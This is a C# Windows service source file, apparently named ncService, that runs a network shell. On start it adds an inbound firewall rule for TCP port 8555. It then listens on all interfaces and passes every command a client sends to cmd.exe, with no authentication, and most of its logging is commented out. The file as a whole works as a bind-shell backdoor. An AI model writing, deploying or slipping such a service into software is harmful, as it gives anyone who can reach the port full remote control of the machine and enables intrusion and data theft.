using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.ServiceProcess;
using System.Text;
using System.Threading;

namespace ncService
{
    public partial class Service1 : ServiceBase
    {
        private const int Port = 8555;
        private const string FirewallRuleName = "ShellService Port 8555";
        private Thread serverThread;

        public Service1()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
// LogEvent("ShellService starting.");

            EnsureFirewallRuleExists();

            serverThread = new Thread(StartServer);
            serverThread.IsBackground = true;
            serverThread.Start();

 //           LogEvent("ShellService started.");
        }

        protected override void OnStop()
        {
//            LogEvent("ShellService stopping.");

            serverThread?.Abort();

//            LogEvent("ShellService stopped.");
        }

        private void EnsureFirewallRuleExists()
        {
            try
            {
                string output = ExecuteCommand("netsh", $"advfirewall firewall show rule name=\"{FirewallRuleName}\"", true);
                if (!output.Contains(FirewallRuleName))
                {
                    ExecuteCommand("netsh", $"advfirewall firewall add rule name=\"{FirewallRuleName}\" dir=in action=allow protocol=TCP localport={Port}", false);
 //                   LogEvent($"Added firewall rule: {FirewallRuleName}");
                }
                else
                {
 //                   LogEvent($"Firewall rule already exists: {FirewallRuleName}");
                }
            }
            catch (Exception ex)
            {
                LogEvent($"Error ensuring firewall rule exists: {ex.Message}", EventLogEntryType.Error);
            }
        }

        private void StartServer()
        {
            try
            {
                TcpListener listener = new TcpListener(IPAddress.Any, Port);
                listener.Start();

//                LogEvent($"Server started. Listening on port {Port}...");

                while (true)
                {
                    TcpClient client = listener.AcceptTcpClient();
   //                 LogEvent($"Client connected: {client.Client.RemoteEndPoint}");

                    HandleClient(client);
                }
            }
            catch (Exception ex)
            {
                LogEvent($"Error starting server: {ex.Message}", EventLogEntryType.Error);
            }
        }

        private void HandleClient(TcpClient client)
        {
            try
            {
                NetworkStream stream = client.GetStream();
                StreamReader reader = new StreamReader(stream, Encoding.ASCII);
                StreamWriter writer = new StreamWriter(stream, Encoding.ASCII) { AutoFlush = true };

                writer.WriteLine("Welcome to the shell service. Type 'exit' to disconnect.");

                string currentDirectory = Environment.CurrentDirectory; // Store the initial current directory

                while (true)
                {
                    writer.Write($"{currentDirectory}> "); // Show the current directory in the prompt
                    string command = reader.ReadLine();

                    if (command == "exit")
                        break;

                    if (command.StartsWith("cd ")) // Check if the command is 'cd' to change directory
                    {
                        string newDirectory = command.Substring(3).Trim(); // Extract the new directory path
                        if (Directory.Exists(newDirectory)) // Check if the directory exists
                        {
                            Environment.CurrentDirectory = newDirectory; // Change the current directory
                            currentDirectory = Environment.CurrentDirectory; // Update the stored current directory
                            writer.WriteLine($"Changed directory to: {currentDirectory}");
                        }
                        else
                        {
                            writer.WriteLine($"Directory does not exist: {newDirectory}");
                        }
                    }
                    else // Execute other commands in the current directory
                    {
                        string output = ExecuteCommand("cmd.exe", $"/c {command}", true);
                        writer.WriteLine(output);
                    }
                }

                client.Close();
 //               LogEvent($"Client disconnected: {client.Client.RemoteEndPoint}");
            }
            catch (Exception ex)
            {
                LogEvent($"Error handling client: {ex.Message}", EventLogEntryType.Error);
            }
        }

        private string ExecuteCommand(string command, string arguments, bool redirectOutput)
        {
            try
            {
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.FileName = command;
                startInfo.Arguments = arguments;
                startInfo.RedirectStandardOutput = redirectOutput;
                startInfo.UseShellExecute = false;
                startInfo.CreateNoWindow = true;

                Process process = new Process();
                process.StartInfo = startInfo;
                process.Start();

                if (redirectOutput)
                {
                    string output = process.StandardOutput.ReadToEnd();
                    process.WaitForExit();
                    return output;
                }
                else
                {
                    process.WaitForExit();
                    return $"Command executed successfully.";
                }
            }
            catch (Exception ex)
            {
                return $"Error executing command: {ex.Message}";
            }
        }

        private void LogEvent(string message, EventLogEntryType entryType = EventLogEntryType.Information)
        {
            if (!EventLog.SourceExists("ShellService"))
            {
                EventLog.CreateEventSource("ShellService", "Application");
            }
            EventLog.WriteEntry("ShellService", message, entryType);
        }
    }
}
